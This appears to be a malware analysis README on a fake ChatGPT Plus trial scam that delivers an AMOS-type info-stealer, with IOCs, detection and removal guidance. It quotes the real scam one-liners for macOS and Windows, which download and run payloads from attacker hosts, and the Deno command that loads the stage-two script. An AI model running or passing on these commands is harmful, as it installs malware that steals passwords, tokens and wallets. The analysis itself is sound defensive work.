# ChatGPT Plus Free Trial Scam - Cross-Platform Info-Stealer

If you ran the scam command, go to [Emergency Removal](#-emergency-removal).

[![Malware Type](https://img.shields.io/badge/type-InfoStealer-red)](#)
[![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows-lightgrey)](#)
[![Family](https://img.shields.io/badge/family-AMOS%20%2F%20Atomic%20Stealer-orange)](#)
[![Date](https://img.shields.io/badge/analysis-2026--05--24-blue)](#)

## Summary

Fake "ChatGPT Plus free trial" campaign on YouTube, Reddit, Telegram, Discord, and GitHub. Installs a cross-platform info-stealer that takes browser passwords, cookies, crypto wallets, Discord/Telegram tokens, and macOS Keychain data.

The malware runs on a MaaS platform. Affiliates buy access and launch their own campaigns. The one analyzed here uses the handle "alex" (user ID `600bf5e68c9cf61a`).

Keywords: ChatGPT scam, info-stealer, AMOS stealer, Atomic Stealer, ClickFix, Deno malware, macOS malware, Windows malware, MaaS, crypto wallet stealer, browser password stealer

## Distribution

This campaign showed up in these places:

- YouTube videos: [1](https://www.youtube.com/watch?v=15hp_jTW4s8), [2](https://www.youtube.com/watch?v=3tN0fB0t_UM)
- YouTube community post: [link](https://www.youtube.com/post/UgkxWUulxH7zXJ8SdMMRz0LcSB1lNjdPRGgO)
- GitHub repo: `ai-gen-profi/chatgpt-trial-gen`
- Reddit, Telegram, Discord posts

Victims are told the "official web version is temporarily unavailable" and should run a terminal command instead. That command downloads and runs the malware.

## What the scam commands do

macOS:
```bash
cd $TMPDIR && curl -O http://45.137.99.121/claude && xattr -c claude && chmod +x claude && ./claude
```

Windows:
```cmd
curl -Lo %temp%\s.msi https://raw.githubusercontent.com/ai-gen-profi/chatgpt-trial-gen/main/gpt.msi && msiexec /i %temp%\s.msi
```

`xattr -c` removes the macOS quarantine flag. No legit software requires that.

## macOS analysis

- Mach-O Universal Binary (x86_64 + arm64)
- 674 KB (older builds) or 591 KB (newer builds)
- Compiled with C++ (libc++, libSystem)
- No code signature (that's why xattr -c is needed)
- Uses CommonCrypto: `CCCrypt` (AES) + `CCKeyDerivationPBKDF` (PBKDF2)
- All strings are AES-encrypted in `__data` (~384 byte high-entropy blob)
- No socket APIs (socket, connect, send, recv) - uses `popen()` to spawn system `curl` for C2 communication
- Links: `CCCrypt`, `CCKeyDerivationPBKDF`, `std::filesystem::recursive_directory_iterator`, `popen`, `system`, `fork`, `setsid`, `getpwuid`

The five 591 KB builds (`autotune`, `finalcut`, `logicpro`, `kontakt8`, `zenology`) are 99.88% byte-identical. Only ~730 bytes differ in the encrypted config blob (per-build salt/IV).

## Windows analysis

### Stage 1 - MSI installer

| Field | Value |
|---|---|
| Author | Alpha29 |
| Subject | echo_app15 |
| Comments | kontakt8 |
| Build tool | msitools 0.106.31-bf14 (Linux) |
| Created | 2026-05-16 15:11:57 UTC |

Custom Action `RunLauncher` runs `kilo_piece66.cmd` after InstallFinalize. The cmd file launches `lima26.ps1` hidden via PowerShell.

### Stage 1.5 - lima26.ps1

1. Bypasses ExecutionPolicy
2. Installs Scoop package manager from get.scoop.sh
3. Installs WinGet via Scoop
4. Installs Deno via WinGet (`DenoLand.Deno`)
5. Runs: `deno -A "http://ms-telemetry-gateway-us.com/acca66ea4f9f6efe.js"`

This abuses legitimate tools (Scoop, WinGet, Deno) so AV/EDR only sees known signed software being installed.

### Stage 2 - Obfuscated JS Loader

- 17 KB, obfuscated with obfuscator.io
- Extracted JWT payload:
```json
{
  "buildId":    "acca66ea4f9f6efe",
  "buildNote":  "kontakt8",
  "buildType":  "msi",
  "proxyUrls":  ["http://ms-telemetry-gateway-us.com"],
  "userId":     "600bf5e68c9cf61a",
  "userNote":   "alex",
  "iat":        1778944316
}
```
- Sets Run-Key persistence: `HKCU\...\Run\<hash> = deno -A <payload>`
- Locks TCP port 2744 (single-instance)
- Sends machine fingerprint to C2 (username + hostname + RAM + OS)
- Downloads Stage 3 dynamically (per-victim generated)
- Heartbeat loop with ~15 second interval (16121ms)

### Stage 3

Not available for static analysis. Generated dynamically by C2 per victim. Requires valid JWT and machine ID to download. Based on the AMOS/Atomic Stealer family this is the actual stealer code (browser credentials, wallets, tokens etc).

## C2 infrastructure

**45.137.99.121** - Apache 2.4.58 (Ubuntu), Directory Listing ON. Still active as of 2026-05-24.

Publicly accessible files:

| File | Size | Last modified |
|---|---|---|
| claude | 674K | 2026-05-08 16:27 |
| tbot | 674K | 2026-05-09 15:40 |
| autotune | 577K | 2026-05-16 14:56 |
| finalcut | 577K | 2026-05-16 14:56 |
| kontakt8 | 577K | 2026-05-16 14:56 |
| logicpro | 577K | 2026-05-16 14:55 |
| zenology | 577K | 2026-05-16 14:55 |
| kontakt8.msi | 13K | 2026-05-16 15:13 |
| autotuneplugin | 13K | 2026-05-16 15:14 |
| zenology.msi | 13K | 2026-05-16 15:14 |

**ms-telemetry-gateway-us.com** - Caddy reverse proxy. JWT-authenticated C2 for Windows victims.

## MITRE ATT&CK

| Technique | ID | Evidence |
|---|---|---|
| ClickFix | T1566.003 | "Service unavailable, run this command" lure |
| Command and Scripting Interpreter | T1059.003 | PowerShell for Deno installation |
| Living off the Land | T1105 | Scoop, WinGet, Deno abuse |
| Boot or Logon Autostart Execution | T1547.001 | Run-Key persistence |
| Create or Modify System Process | T1543.001 | LaunchAgent persistence (macOS) |
| Credentials from Password Stores | T1555 | Browser password extraction |
| Exfiltration Over C2 Channel | T1041 | popen("curl ...") |
| Masquerading | T1036 | Fake Microsoft Telemetry domain |
| Obfuscated Files or Information | T1027 | obfuscator.io, AES-encrypted strings |

## Operator details

- NATO phonetic naming: Alpha29 (MSI author), lima26.ps1, kilo_piece66.cmd, echo_app15 (build subject)
- Affiliate handle: alex
- Affiliate user ID: 600bf5e68c9cf61a
- Build ID acca66ea4f9f6efe assigned by the platform server

## File hashes (SHA-256)

Full list in `iocs/hashes.txt`.

```
062d5fc1cfa93e0ad53c985c896017c72acc9e22c889ba3b43c9e238d6d9721d  claude
8fe79f33e0d7e01a6c269fdf06a09c918ed66651d92bd5e2da4f8777ca8fd28c  tbot
086cb1b17b6e2a2b57651448026d2e7d9af7d463a1374c59ca407bc3f6222abc  autotune
22c74438159f69394d18deb8d392daaa9fac09cf9c8c31bca53a80041b9bf12f  finalcut
d97f51850ed224f560b14d5004751a56a8acf27f079319c53dfc3aa170ba87f2  logicpro
f6dc17a584e1e933eac4ff31ddba4fffbc155b7da7c25be79aa3dbb7ab782205  kontakt8
28da68972f3dd7fa7b15064994e5b4e83ed15328972c1674dbf84c7864171f87  zenology
c366c04c4646f96dd19d0fa37127c93e2c9620af75252714b5bd2e9efc7457c7  kontakt8.msi
82ad00845559e17e8926af26d384504ebffb998f3779906d529d96dcd5493123  autotuneplugin.msi
eefdd9558952183ed3d02a3e277fb8de410e73f08b9508e31642eefc033869f5  acca66ea4f9f6efe.js (Stage 2 loader)
```

## Network IOCs

Full list in `iocs/network.txt`.

```
45.137.99.121
ms-telemetry-gateway-us.com
http://45.137.99.121/*
http://ms-telemetry-gateway-us.com/*
https://raw.githubusercontent.com/ai-gen-profi/chatgpt-trial-gen/*
```

## Detection rules

YARA rules in `detection/yara/` - 4 basic + 8 detailed rules covering Mach-O binaries, JS loader (obfuscated and deobfuscated), PowerShell scripts, CMD batch files, JWT tokens, and C2 communication patterns.

Sigma rules in `detection/sigma/` - 4 rules covering Deno loader execution, PowerShell Scoop/Deno installation, registry persistence, and MSI drop detection.

Suricata rules in `detection/suricata/` - 5 rules for HTTP traffic to C2 domains and endpoints.

Snort rules in `detection/snort/` - 7 rules covering all C2 communication stages.

## Removal scripts

`scripts/remove_windows.ps1` and `scripts/remove_macos.sh`. Both have a dry-run mode (`-DryRun` / `--dry-run`) that shows findings without deleting anything. Run that first.

The removal scripts were audited statically - see `analysis/removal_script_audit.md` for coverage details. Windows covers ~95% of current variant, macOS ~90%.

## Emergency removal

### Windows quick check

```powershell
Get-Process deno -ErrorAction SilentlyContinue | Select-Object Id, Path, CommandLine
netstat -ano | findstr ":2744"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-List
Test-Path "HKCU:\Software\Alpha29"
```

### macOS quick check

```bash
ps aux | grep -E "(claude|tbot|autotune|finalcut|logicpro|kontakt8|zenology)" | grep -v grep
ls ~/Library/LaunchAgents/ | grep -viE "(com\.apple|com\.google|com\.microsoft)"
ls -la $TMPDIR | grep -E "(claude|tbot|autotune|finalcut|logicpro|kontakt8|zenology)"
```

### Automated removal

Windows (as Administrator):
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\scripts\remove_windows.ps1
```

macOS:
```bash
chmod +x scripts/remove_macos.sh
sudo ./remove_macos.sh
```

Full manual removal steps are in the removal scripts themselves and in `analysis/removal_script_audit.md`.

### After removal

Change passwords. The malware may have already exfiltrated everything before you removed it.

1. Browser-saved passwords (especially banking, email, social media)
2. Discord - change password (invalidates old token), enable 2FA
3. Telegram - Settings > Devices > Terminate all other sessions
4. Email passwords (used for password resets of other services)
5. Enable 2FA everywhere (TOTP app, not SMS)
6. Crypto wallets - create new wallet, transfer funds immediately. Treat old wallet as compromised.
7. Credit cards saved in browser - cancel and request new ones

## Reporting

| What | Where |
|---|---|
| Hashes to MalwareBazaar | https://bazaar.abuse.ch/submit/ |
| URLs to URLhaus | https://urlhaus.abuse.ch/api/#submit |
| IP to hosting abuse | whois 45.137.99.121 |
| GitHub repo to T&S | tos-reports@github.com |
| Scam repo | https://github.com/ai-gen-profi/chatgpt-trial-gen (reported 2026-05-24) |

## How to protect yourself

- Don't paste terminal commands from the internet that you don't understand
- `xattr -c` / `xattr -d` is a red flag - legit software never requires this
- `deno -A` / `node --allow-all` disables all security boundaries
- "Service temporarily unavailable, use API instead" is the ClickFix playbook
- Check GitHub repos before running anything: account age, stars, forks, contributors, issues
- Free full versions of expensive software (Logic Pro, Kontakt, Final Cut) don't exist

## Disclaimer

I don't take responsibility for the content in this repository. This is for educational and defensive security research purposes. All IOCs, analysis, and removal scripts are provided as-is. Use at your own risk.

## License

CC0 1.0 Universal. All IOCs, hashes, and analysis can be freely redistributed.
